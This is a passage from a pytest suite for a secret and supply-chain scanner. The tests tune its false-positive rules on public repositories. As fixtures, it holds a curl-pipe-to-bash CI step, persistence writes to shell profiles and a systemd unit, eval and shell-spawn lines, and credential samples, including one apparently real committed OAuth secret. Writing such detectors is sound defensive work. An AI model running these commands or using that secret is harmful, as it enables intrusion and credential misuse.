    The backslash test is the broadest of the four and is exact rather than
    heuristic: generated key material is base64, base62 or hex, and none of those
    alphabets contains a backslash. One in a value means an escape sequence, a Windows
    path or a regular expression.
    """

    @pytest.mark.parametrize(
        "value",
        [
            b"*keyFileData",
            b"<< *defaults",
            b"_recoveredFromDisk",
            rb"\A([[:alpha:]_](?:\w*))",
            rb"\A([-]?(?:(?:\.\d+)|(?:\d+(?:\.\d*)?)))",
            rb"C:\Users\runner\AppData",
        ],
    )
    def test_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is not None

    @pytest.mark.parametrize(
        "value",
        [
            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
            b"npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
            b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            b"glpat-AAAAAAAAAAAAAAAA",
        ],
    )
    def test_key_material_still_is(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is None

    def test_an_installer_property_is_a_placeholder(self) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(b"[MONGO_SERVICE_ACCOUNT_PASSWORD]") is not None
        assert PLACEHOLDER.search(b"xKc9vB2mQ7wRtY4u") is None

    def test_a_certificate_corpus_is_test_material(self) -> None:
        """Twenty-eight keys under `x509/static/` -- a CA, an intermediate, a rollover
        pair, OCSP responders, PKCS#1 and PKCS#8 variants -- are a hierarchy built for
        an authentication test suite. gRPC's vendored `test_creds/` is thirteen more."""
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material("x509/static/intermediate_ca_key.pem")
        assert is_test_material("src/third_party/grpc/dist/src/core/tsi/test_creds/ca.key")
        assert not is_test_material("deploy/production/server.key")

    def test_a_deployed_key_is_not(self, tmp_path) -> None:
        """The control: the same file shape outside a corpus keeps its severity."""
        from cordon_scanner.core.models import Severity

        deploy = tmp_path / "deploy"
        deploy.mkdir()
        (deploy / "server.key").write_bytes(
            assemble(
                "-----BEGIN RSA ",
                "PRIVATE KEY-----\n",
                "MIIEogIBAAKCAQEApzGQY8ArzFscOCT1b8TXURrlIRJwETKfbEKo4frXrXj1MCti\n",
                "-----END RSA ",
                "PRIVATE KEY-----\n",
            ).encode()
        )
        keys = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert keys and any(f.severity >= Severity.HIGH for f in keys)


class TestTheSecondPassOverTheCorpus:
    """Defects found by triaging the repositories the full measurement run reported
    first, while it was still running. Each is a distinct class.

    `gitleaks` 151 -> 0, `rustls` 34 -> 1, `jest` 26 -> 0, `grafana` 38 -> 5,
    `react` 12 -> 1.
    """

    @staticmethod
    def material(path: str, raw: bytes) -> bool:
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw)).is_rule_material

    def test_a_rule_built_in_code_with_its_own_samples(self) -> None:
        """gitleaks writes its rules in Go and validates each against its own true and
        false positives, so the file holds a rule, a regex, and the sample keys the
        regex is tested with. 132 of its 151 findings were those files.

        Both halves are required: a rule id alone is not enough, and `validate(` is an
        ordinary function name."""
        rule = (
            b"func AnthropicApiKey() *config.Rule {\n"
            b'\tr := config.Rule{\n\t\tRuleID: "anthropic-api-key",\n'
            b"\t\tRegex: utils.GenerateUniqueTokenRegex(`sk-ant-api03-[a-z]{93}AA`, false),\n\t}\n"
            b'\ttps := []string{"sk-ant-api03-" + strings.Repeat("a", 93) + "AA"}\n'
            b'\tfps := []string{"sk-ant-api03-short"}\n'
            b"\treturn utils.Validate(r, tps, fps)\n}\n"
        )
        assert self.material("cmd/generate/config/rules/anthropic.go", rule)

    def test_a_rule_id_alone_is_not_enough(self) -> None:
        assert not self.material(
            "internal/audit/emit.go", b'func emit(e Event) { log.Info("rule_id:", e.RuleID) }\n'
        )

    def test_a_toml_ruleset(self) -> None:
        assert self.material(
            "config/gitleaks.toml",
            b'title = "gitleaks config"\n\n[[rules]]\n'
            b"id = \"slack-bot-token\"\nregex = '''xoxb-[0-9]{10}'''\n"
            b'description = "Slack bot token"\n',
        )

    def test_an_ordinary_toml_is_not(self) -> None:
        assert not self.material(
            "pyproject.toml", b'[project]\nname = "thing"\nversion = "1.0.0"\n'
        )

    def test_a_scanner_suppression_file(self) -> None:
        """A file whose whole purpose is to hold another tool's findings: fingerprints,
        file-and-line references, and in several formats the matched value."""
        assert self.material(".gitleaksignore", b"a1b2c3:config/test.go:aws-access-key:12\n")
        assert self.material(".secrets.baseline", b'{"results": {}}\n')

    @pytest.mark.parametrize(
        "path",
        [
            "bogo/keys/rsa_2048_key.pem",
            "test-ca/ecdsa-p256/ca.key",
            "devenv/docker/blocks/auth/key.pem",
        ],
    )
    def test_a_generated_test_hierarchy_is_test_material(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)

    def test_a_deployed_key_is_not(self) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert not is_test_material("deploy/production/server.key")
        assert not is_test_material("config/tls/server.key")

    @pytest.mark.parametrize(
        ("value", "sequential"),
        [
            (b"abcdefghijklmnopqrstuvwxyz0123456789", True),
            (b"ABCDEFGHIJKLMNOPQRST", True),
            (b"0123456789ab", True),
            (b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", False),
            (b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7", False),
        ],
    )
    def test_an_alphabet_is_not_a_token(self, value: bytes, sequential: bool) -> None:
        """Entropy cannot tell the alphabet in order from a random string of the same
        characters: as a multiset it is maximally diverse, which is what Shannon
        entropy measures. Grafana assigns exactly that to `TOKEN_ALPHABET`, which is
        what its branch-name generator draws from."""
        from cordon_scanner.detect.secrets import looks_sequential

        assert looks_sequential(value) is sequential

    def test_a_yarn_workspace_entry_needs_no_hash(self, tmp_path) -> None:
        """Every Yarn Berry lockfile contains an entry for its own root, with no
        checksum because there is nothing to fetch. 24 of Jest's 26 blocking findings
        were that one entry, and 616 findings across 202 of 1,427 repositories."""
        (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}')
        (tmp_path / "yarn.lock").write_bytes(
            b"__metadata:\n  version: 10\n\n"
            b'"browser-resolve@npm:^2.0.0":\n'
            b"  version: 2.0.0\n"
            b'  resolution: "browser-resolve@npm:2.0.0"\n'
            b"  checksum: 10/ad5314db3429a903b07d6445137588665c4677d6276298bb08f0623f05cb1077\n"
            b"  languageName: node\n  linkType: hard\n\n"
            b'"root-workspace-0b6124@workspace:.":\n'
            b"  version: 0.0.0-use.local\n"
            b'  resolution: "root-workspace-0b6124@workspace:."\n'
            b"  languageName: unknown\n  linkType: soft\n"
        )
        ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
        assert "POLICY.LOCKFILE.INTEGRITY.001" not in ids

    def test_a_registry_entry_without_a_hash_still_is(self, tmp_path) -> None:
        (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}')
        (tmp_path / "yarn.lock").write_bytes(
            b"__metadata:\n  version: 10\n\n"
            b'"left-pad@npm:^1.3.0":\n'
            b"  version: 1.3.0\n"
            b'  resolution: "left-pad@npm:1.3.0"\n'
            b"  languageName: node\n  linkType: hard\n\n"
            b'"right-pad@npm:^1.0.0":\n'
            b"  version: 1.0.0\n"
            b'  resolution: "right-pad@npm:1.0.0"\n'
            b"  checksum: 10/ad5314db3429a903b07d6445137588665c4677d6276298bb08f0623f05cb1077\n"
            b"  languageName: node\n  linkType: hard\n"
        )
        ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
        assert "POLICY.LOCKFILE.INTEGRITY.001" in ids

    def test_a_photoshop_document_named_png_is_a_naming_error(self) -> None:
        """Jest's `website/static/img/favicon.png` is a PSD. The mismatch check could
        only say "not png image" because PSD was not in the format table, and an image
        saved in the wrong format is a naming error whichever direction it goes."""
        from cordon_scanner.detect.binary import BinaryDetector

        psd = b"8BPS\x00\x01" + b"\x00" * 64
        assert BinaryDetector.mismatch("favicon.png", BinaryDetector.identify(psd)) is None

    def test_an_executable_named_png_still_is_not(self) -> None:
        from cordon_scanner.detect.binary import BinaryDetector

        assert BinaryDetector.mismatch("favicon.png", BinaryDetector.identify(ELF)) is not None


class TestDocumentationInsideSourceIsStillDocumentation:
    """`ansible-collections/community.general` produced 29 findings and every one was
    inside an Ansible module's own documentation: `DOCUMENTATION`, `EXAMPLES` and
    `RETURN` are the contract every one of its thousands of modules carries, a YAML
    document held in a string, and the examples in it are written the way examples are.

    The path test cannot answer this. `plugins/modules/consul_token.py` is source, and
    the example token is inside it.

    Every bare string statement counts, not only the first statement of a scope: a
    string whose value is discarded does nothing at runtime and is there to be read.
    That includes the attribute docstrings PEP 258 describes, which is the convention
    this project's own source is written in -- and the self-scan proved it within one
    run, reporting three credentials in a docstring quoting the Ansible examples above.
    """

    @staticmethod
    def spans(source: str):
        from cordon_scanner.detect.secrets import documentation_spans

        return documentation_spans(source)

    def test_an_ansible_example_block_is_documentation(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        plugins = tmp_path / "plugins" / "modules"
        plugins.mkdir(parents=True)
        (plugins / "consul_token.py").write_bytes(
            (
                "#!/usr/bin/python\n"
                "EXAMPLES = r'''\n"
                "- name: Create a token\n"
                "  community.general.consul_token:\n"
                "    token: " + assemble("8adddd91-0bd6-", "d41d-ae1a-3b49cfa9a0e8") + "\n"
                "'''\n\n"
                "def main():\n    pass\n"
            ).encode()
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert all(f.severity <= Severity.MEDIUM for f in secrets), [
            (f.rule_id, f.severity) for f in secrets
        ]

    def test_the_same_value_in_code_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        plugins = tmp_path / "plugins" / "modules"
        plugins.mkdir(parents=True)
        # A base62 token rather than the UUID the documented case above uses. A UUID
        # is now graded to MEDIUM wherever it sits -- see `CANONICAL_UUID` -- so as a
        # control for the documentation ceiling it would have asserted nothing.
        (plugins / "consul_token.py").write_bytes(
            ("TOKEN = " + repr(assemble("Xk9mQ2vB7wRt", "Y4uZp1LsDy3Fz6Hj")) + "\n").encode()
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert secrets and any(f.severity >= Severity.HIGH for f in secrets)

    def test_an_attribute_docstring_counts(self) -> None:
        source = 'NAMES = ("a",)\n"""What these names are for."""\n'
        assert len(self.spans(source)) == 1

    def test_a_function_docstring_counts(self) -> None:
        source = 'def f():\n    """Does a thing."""\n    return 1\n'
        assert len(self.spans(source)) == 1

    def test_an_unparsable_file_gets_no_exemption(self) -> None:
        """The safe direction: a file this cannot parse is treated as all code."""
        assert self.spans("def f(:\n  pass\n") == ()


class TestAWorkspaceMemberHasNothingToHash:
    """`POLICY.LOCKFILE.INTEGRITY.001` was 119 findings across 34 of the first 228
    repositories the full run reached, and the npm half of it was every workspace
    member of every monorepo.

    A `package-lock.json` lists a workspace three ways at once: the directory itself
    as a key outside `node_modules/`, a `node_modules/@scope/name` entry with
    `"link": true` pointing at it, and a `resolved` that is a path rather than a URL.
    None of them carries an integrity hash because there is nothing to fetch, and the
    parser recorded none of them as local -- `NousResearch/hermes-agent` supplied
    fourteen in one file.
    """

    @staticmethod
    def graph(raw: bytes):
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.ecosystems.npm import NpmEcosystem

        return NpmEcosystem().parse_lockfile(
            FileContent(path="package-lock.json", raw=raw, size=len(raw))
        )

    LOCK = (
        b'{"name": "root", "lockfileVersion": 3, "packages": {\n'
        b'  "": {"name": "root", "version": "1.0.0"},\n'
        b'  "apps/shared": {"name": "@app/shared", "version": "0.0.0"},\n'
        b'  "node_modules/@app/shared": {"resolved": "apps/shared", "link": true},\n'
        b'  "node_modules/left-pad": {"version": "1.3.0",'
        b' "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",'
        b' "integrity": "sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQGinBN9yTQT"},\n'
        b'  "node_modules/unhashed": {"version": "2.0.0",'
        b' "resolved": "https://registry.npmjs.org/unhashed/-/unhashed-2.0.0.tgz"}\n'
        b"}}\n"
    )

    def test_the_workspace_shapes_are_local(self) -> None:
        local = {e.name for e in self.graph(self.LOCK).entries if e.local}
        assert local == {"@app/shared"}

    def test_a_registry_entry_without_a_hash_is_not(self) -> None:
        """The control, in the same file: one entry really is unhashed, and the rule
        has to keep saying so."""
        graph = self.graph(self.LOCK)
        unhashed = {e.name for e in graph.entries if not e.local and not e.integrity}
        assert unhashed == {"unhashed"}

    def test_end_to_end(self, tmp_path) -> None:
        (tmp_path / "package.json").write_text('{"name": "root", "version": "1.0.0"}')
        (tmp_path / "package-lock.json").write_bytes(self.LOCK)
        ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
        assert "POLICY.LOCKFILE.INTEGRITY.001" in ids, "the one real entry is still reported"

    def test_a_workspace_only_lockfile_is_quiet(self, tmp_path) -> None:
        (tmp_path / "package.json").write_text('{"name": "root", "version": "1.0.0"}')
        (tmp_path / "package-lock.json").write_bytes(
            b'{"name": "root", "lockfileVersion": 3, "packages": {\n'
            b'  "": {"name": "root", "version": "1.0.0"},\n'
            b'  "apps/shared": {"name": "@app/shared", "version": "0.0.0"},\n'
            b'  "node_modules/@app/shared": {"resolved": "apps/shared", "link": true},\n'
            b'  "node_modules/left-pad": {"version": "1.3.0",'
            b' "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",'
            b' "integrity": "sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQGinBN9yTQT"}\n'
            b"}}\n"
        )
        ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
        assert "POLICY.LOCKFILE.INTEGRITY.001" not in ids

    def test_a_dotnet_test_certificate_directory_is_test_material(self) -> None:
        """ASP.NET Core keeps eight keys under `src/Shared/TestCertificates/`, which
        the glob list missed because it had three spellings of `test-certs` and not the
        word written out."""
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material("src/Shared/TestCertificates/https-ecdsa.key")
        assert not is_test_material("deploy/certs/server.key")


class TestAGradleSourceSetIsStillATestTree:
    """Spring Boot keeps nineteen TLS keys under `src/dockerTest/resources/` -- a client
    certificate per integration test, generated by a script in the same tree -- and the
    glob list had met `javaRestTest`, `yamlRestTest`, `internalClusterTest` and
    `integTest` and none of the rest of the family.

    `SUSPECT.CI.FETCH_EXEC.001` gets the mitigation its container twin already had: a
    pinned release download is a step down, and a pipe from an unpinned URL into a shell
    is not.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "module/spring-boot-ldap/src/dockerTest/resources/server.key",
            "src/integrationTest/resources/client.key",
            "packages/testserver/key.pem",
            "pilot/cmd/pilot-agent/status/test-cert/cert.key",
            "fuzz/dtlsserver.c",
            "scripts/mock-api/wiremock/mappings.json",
        ],
    )
    def test_these_are_test_material(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)

    @pytest.mark.parametrize(
        "path",
        [
            "deploy/production/server.key",
            "docs/latest/guide.md",
            "src/main/resources/application.key",
        ],
    )
    def test_these_are_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert not is_test_material(path)

    def test_a_pinned_ci_download_is_one_step_lower(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        flow = tmp_path / ".github" / "workflows"
        flow.mkdir(parents=True)
        (flow / "build.yml").write_bytes(
            b"jobs:\n  build:\n    steps:\n"
            b"      - run: |\n"
            b"          curl -fsSL -o /tmp/uv https://github.test/astral-sh/uv/releases/download/0.5.1/uv\n"
            b"          chmod +x /tmp/uv\n"
        )
        found = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001"
        ]
        assert found, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in found)

    def test_an_unpinned_pipe_into_a_shell_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        flow = tmp_path / ".github" / "workflows"
        flow.mkdir(parents=True)
        (flow / "build.yml").write_bytes(
            b"jobs:\n  build:\n    steps:\n"
            b"      - run: curl -fsSL https://install.test/setup.sh | bash\n"
        )
        found = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001"
        ]
        assert found and any(f.severity >= Severity.HIGH for f in found)


class TestTheValueIsAnExpressionInEveryLanguage:
    """The generic credential-assignment rule was 681 findings across 137 of the first
    500 repositories measured, and fetching the exact lines showed the same defect in
    six more language idioms. Every one is a reference to other code, or a literal that
    no generator produces:

        @next_token = @scanner.next_token                   # Ruby instance variables
        token = Homebrew::EnvConfig.github_packages_token   # Ruby scope resolution
        ACCESS_TOKEN_UPDATE_FREQUENCY = 24.hours.freeze     # a numeric receiver
        PASS = "\\033[32mPASS\\033[0m"                        # an ANSI escape
        checksum_token = "DontStealMyGamePlz__WINNERS_..."  # doubled underscores
        let real_token = "provider_abcdefghijklmnop..."     # the alphabet in order

    The backslash test is the broad one and it is exact rather than heuristic:
    generated key material is base64, base62 or hex, and none of those alphabets
    contains a backslash.
    """

    @pytest.mark.parametrize(
        "value",
        [
            b"@scanner.next_token",
            b"@@class_level",
            b"Homebrew::EnvConfig.github_packages_token",
            b"24.hours.freeze",
            rb"\033[32mPASS\033[0m",
            rb"C:\Users\runner\AppData",
            b"DontStealMyGamePlz__WINNERS_DONT_USE_DRUGS__DONT_COPY_THAT_FLOPPY",
            b"copilot:get-copilot-token",
            b"ssh:key-passphrase",
        ],
    )
    def test_quiet(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is not None

    @pytest.mark.parametrize(
        "value",
        [
            b"dbw2OtmVEeuUvIptb1Coyg",
            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
            b"glpat-AAAAAAAAAAAAAAAA",
            b"npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
            b"SW2YcwTIb9zpOOhoPsMm",
            b"9aG4bV2xQ8zL5tR7wY1u",
        ],
    )
    def test_key_material_still_reported(self, value: bytes) -> None:
        """Including one real one: `dbw2OtmVEeuUvIptb1Coyg` is the PikPak OAuth client
        secret `AlistGo/alist` commits, and it stays a finding."""
        from cordon_scanner.detect.secrets import PLACEHOLDER, looks_sequential

        assert NOT_A_SECRET.match(value) is None
        assert PLACEHOLDER.search(value) is None
        assert not looks_sequential(value)

    @pytest.mark.parametrize(
        ("value", "sequential"),
        [
            (b"abcdefghijklmnopqrstuvwxyz0123456789", True),
            (b"provider_abcdefghijklmnopqrstuvwx", True),
            (b"ABCDEFGHIJKLMNOPQRST", True),
            # Ten ascending characters inside a forty-character value is not an
            # alphabet, and a hand-written fake often has exactly that.
            (b"sk-proj-EXAMPLEONLYnotre1234567890abcd", False),
            (b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYKEY", False),
        ],
    )
    def test_the_sequence_has_to_be_the_value(self, value: bytes, sequential: bool) -> None:
        from cordon_scanner.detect.secrets import looks_sequential

        assert looks_sequential(value) is sequential


class TestAnImportIsADeclaration:
    """Two capability packs treated an import as the operation it names.

    `CherryHQ/cherry-studio` anchored a `SUSPECT.DECODE_EXEC.001` finding on
    `import { execFile } from 'node:child_process'` -- the first line of the file, two
    hundred lines from anything it was paired with -- and `DioxusLabs/dioxus` anchored
    one on `use flate2::read::GzDecoder;` at the top of a WebAssembly optimiser.

    An import says the file may do something somewhere. The call site says where, and
    the call site matches on its own, so the import added nothing except a hit at line
    1 that widened every proximity window in the file.

    `require('child_process').exec(...)` is kept, because there the module reference IS
    the call.
    """

    @staticmethod
    def lines(source: str, language: str, capability: str) -> set[int]:
        return TestARegexMatchIsNotAProcess.capability_lines(source, language, capability)

    def test_a_javascript_import_is_not_a_spawn(self) -> None:
        source = (
            "import { execFile } from 'node:child_process'\nconst cp = require('child_process')\n"
        )
        assert self.lines(source, "typescript", "spawn") == set()

    def test_the_call_still_is(self) -> None:
        for source in (
            "execFile('/bin/ls', []);\n",
            "require('child_process').exec(cmd);\n",
            "cproc.spawn('sh', ['-c', cmd]);\n",
        ):
            assert self.lines(source, "javascript", "spawn"), source

    @pytest.mark.parametrize(
        ("rule_id", "line", "matches"),
        [
            # The decompression half, which is where the flate2 patterns moved when
            # `decompress` became a primitive of its own. The claim under test is
            # unchanged: a call matches and an import does not.
            ("CAP.BUILD.DECOMPRESS.001", b"use flate2::read::GzDecoder;", False),
            ("CAP.BUILD.DECOMPRESS.001", b"use flate2::read::ZlibDecoder;", False),
            ("CAP.BUILD.DECOMPRESS.001", b"let mut d = GzDecoder::new(bytes);", True),
            ("CAP.BUILD.DECOMPRESS.001", b"let out = flate2::read::GzDecoder::new(x);", True),
            ("CAP.BUILD.DECODE.001", b"let raw = base64::decode(BLOB).unwrap();", True),
            # And the two no longer answer for each other, which is the point of
            # separating them.
            ("CAP.BUILD.DECODE.001", b"let mut d = GzDecoder::new(bytes);", False),
        ],
    )
    def test_the_rust_decode_patterns(self, rule_id: str, line: bytes, matches: bool) -> None:
        from cordon_scanner.rules.loader import RuleLoader, RuleSet

        rules = RuleSet(RuleLoader.load_builtin())
        compiled = next(r for r in rules if r.id == rule_id)
        assert bool(compiled.match.regex.search(line)) is matches


class TestAFieldCalledProfileIsNotAShellProfile:
    """`NousResearch/hermes-agent` was the most stubborn repository in the corpus -- 106
    blocking findings at the start of this session -- and its last dozen were six more
    classes, each a word that means one thing in an operating system and another in a
    program.

    `.profile` matched `payload.profile`, so three React components were persistence
    mechanisms. `.service` matched `./notifications.service`, which is what Angular
    calls every file in a codebase. `__import__("time")` was dynamic execution.
    `os.environ["X"] = "1"` was credential access, though it writes. `++tokenRef.current`
    and `"--series-input-token"` were credentials, being an increment and the name of a
    CSS variable. And `token="xoxb-wire-probe"` says what it is.
    """

    @staticmethod
    def matches(rule_id: str, line: bytes) -> bool:
        from cordon_scanner.rules.loader import RuleLoader, RuleSet

        compiled = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == rule_id)
        return bool(compiled.match.regex.search(line))

    @pytest.mark.parametrize(
        ("line", "persists"),
        [
            (b"setConsoleProfile(frame.profile || 'current')", False),
            (b"import { NotificationsService } from './notifications.service'", False),
            (b"const profile = String(payload.profile ?? '')", False),
            (b"fs.appendFileSync(os.homedir() + '/.profile', body)", True),
            (b"fs.appendFileSync(`${os.homedir()}/.bashrc`, body)", True),
            (b'fs.writeFileSync("/etc/systemd/system/agent.service", unit)', True),
            (b"cron.schedule('@reboot', () => {}); // crontab", True),
        ],
    )
    def test_the_javascript_persistence_words(self, line: bytes, persists: bool) -> None:
        assert self.matches("CAP.JS.PERSIST.001", line) is persists

    @pytest.mark.parametrize(
        ("line", "executes"),
        [
            (b'__import__("time").time()', False),
            (b"mod = __import__(name)", True),
            (b"eval(payload)", True),
        ],
    )
    def test_a_literal_import_is_resolvable(self, line: bytes, executes: bool) -> None:
        assert self.matches("CAP.PY.EXECUTE.001", line) is executes

    def test_writing_to_the_environment_is_not_reading_it(self) -> None:
        from cordon_scanner.detect.pyast import PythonAnalyzer

        source = (
            "import os\n"
            'os.environ["OAUTHLIB_RELAX_TOKEN_SCOPE"] = "1"\n'
            'tok = os.environ["GITHUB_TOKEN"]\n'
        )
        lines = {
            h.line for h in PythonAnalyzer.analyse(source) if h.capability.name == "CREDENTIAL"
        }
        assert lines == {3}

    @pytest.mark.parametrize(
        "value",
        [
            b"++tokenRef.current",
            b"--series-input-token",
            b"HERMESTEXDISPLAY%dHERMESTEXEND",
            b"xoxb-wire-probe",
            b"123456:fixture",
        ],
    )
    def test_these_are_not_credentials(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert NOT_A_SECRET.match(value) is not None or PLACEHOLDER.search(value) is not None


class TestTheLanguagesOwnPlaceForTests:
    """Three repositories the run reported, three conventions a path glob cannot see.

    `rustfs/rustfs` keeps unit tests where Rust keeps them -- in the file they test,
    under `#[cfg(test)] mod tests` -- and its 51 credential findings were assertions
    about constant-time comparison using AWS's documented example key. The repository
    splits its own source on that exact string, two hundred lines below one of them.

    `bitwarden/server` is a .NET solution of about forty projects that reference each
    other, and a `"type": "Project"` entry in `packages.lock.json` has no `contentHash`
    because there is nothing to fetch -- the same statement npm makes with
    `"link": true`. 73 of its 86 findings.

    `keycloak/keycloak` builds a complete PKI for its integration suite under
    `testsuite/`: a root CA, intermediates, OCSP responders, per-client keys.
    """

    def test_a_rust_test_module_is_found(self) -> None:
        from cordon_scanner.detect.secrets import test_module_spans

        source = (
            "pub fn verify(a: &str) -> bool { a.len() > 0 }\n"
            "\n"
            "#[cfg(test)]\n"
            "mod tests {\n"
            "    use super::*;\n"
            "    #[test]\n"
            "    fn compares() {\n"
            '        let key = "AKIAIOSFODNN7EXAMPLE";\n'
            "        assert!(verify(key));\n"
            "    }\n"
            "}\n"
        )
        spans = test_module_spans(source)
        assert len(spans) == 1
        start, end = spans[0]
        assert source.encode()[start:end].startswith(b"#[cfg(test)]")
        assert source.encode()[start:end].rstrip().endswith(b"}")

    def test_a_file_without_one_costs_nothing(self) -> None:
        from cordon_scanner.detect.secrets import test_module_spans

        assert test_module_spans("pub fn main() {}\n") == ()

    def test_a_credential_in_a_test_module_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "auth.rs").write_bytes(
            (
                "pub fn compare(a: &str, b: &str) -> bool { a == b }\n\n"
                "#[cfg(test)]\nmod tests {\n    use super::*;\n    #[test]\n"
                "    fn compares() {\n"
                '        let secret_key = "' + assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI") + '";\n'
                "        assert!(compare(secret_key, secret_key));\n    }\n}\n"
            ).encode()
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert all(f.severity <= Severity.MEDIUM for f in secrets), [
            (f.rule_id, f.severity) for f in secrets
        ]

    def test_the_same_value_above_the_test_module_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "auth.rs").write_bytes(
            (
                "pub fn connect() {\n"
                '    let secret_key = "' + assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI") + '";\n'
                "    dial(secret_key);\n}\n\n"
                "#[cfg(test)]\nmod tests {\n    #[test]\n    fn nothing() {}\n}\n"
            ).encode()
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert secrets and any(f.severity >= Severity.HIGH for f in secrets)

    def test_a_dotnet_project_reference_needs_no_hash(self) -> None:
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.ecosystems.others import NuGetEcosystem

        raw = (
            b'{"version": 1, "dependencies": {"net10.0": {\n'
            b'  "Core": {"type": "Project"},\n'
            b'  "Serilog": {"type": "Transitive", "resolved": "3.1.1",'
            b' "contentHash": "abcdefghijklmnopqrstuvwxyz=="},\n'
            b'  "Unhashed": {"type": "Transitive", "resolved": "1.0.0"}\n'
            b"}}}\n"
        )
        graph = NuGetEcosystem().parse_lockfile(
            FileContent(path="packages.lock.json", raw=raw, size=len(raw))
        )
        assert {e.name for e in graph.entries if e.local} == {"Core"}
        assert {e.name for e in graph.entries if not e.local and not e.integrity} == {"Unhashed"}

    def test_keycloaks_test_pki_is_test_material(self) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(
            "testsuite/integration-arquillian/servers/auth-server/common/keystore/client-ca.key"
        )


class TestAPatternBesideAnExampleIsARule:
    """The third schema this had to learn. semgrep declares `rules:` with an `id:`,
    gitleaks ships `[[rules]]` in TOML, and `peass-ng/PEASS-ng` writes
    `regular_expresions:` with `name`/`regex`/`example` triples -- several hundred of
    them, each carrying a sample of exactly the credential its regex detects.

    Rather than learn a fourth schema, the question is the one the schemas have in
    common: does this document pair a pattern with an example of what it matches?
    """

    RULE_LIST = (
        b"regular_expresions:\n"
        b"  - name: Airtable API Key\n"
        b"    regexes:\n"
        b"    - name: Airtable\n"
        b"      regex: >\n"
        b"        [\"']?air[-_]?table[-_]?api[-_]?key[\"']?[=:][\"']?.+[\"']\n"
        b'      example: air-table-api-key="5asbtwsfcvfc9zEzFV<p=1PKPlFsaFfasf\'"\n'
    )

    @staticmethod
    def material(path: str, raw: bytes) -> bool:
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw)).is_rule_material

    def test_a_regex_list_with_examples(self) -> None:
        assert self.material("build_lists/regexes.yaml", self.RULE_LIST)

    @pytest.mark.parametrize(
        ("path", "raw"),
        [
            ("config.yaml", b"server:\n  host: localhost\n  password: hunter2\n"),
            (
                "docker-compose.yml",
                b"services:\n  db:\n    environment:\n      POSTGRES_PASSWORD: secret\n",
            ),
            ("values.yaml", b"image:\n  repository: nginx\n  tag: latest\n"),
        ],
    )
    def test_an_ordinary_document_is_not(self, path: str, raw: bytes) -> None:
        assert not self.material(path, raw)

    def test_end_to_end(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        lists = tmp_path / "build_lists"
        lists.mkdir()
        (lists / "regexes.yaml").write_bytes(self.RULE_LIST)
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert all(f.severity <= Severity.INFO for f in secrets), [
            (f.rule_id, f.severity) for f in secrets
        ]


class TestOneCredentialIsOneFindingAcrossFiles:
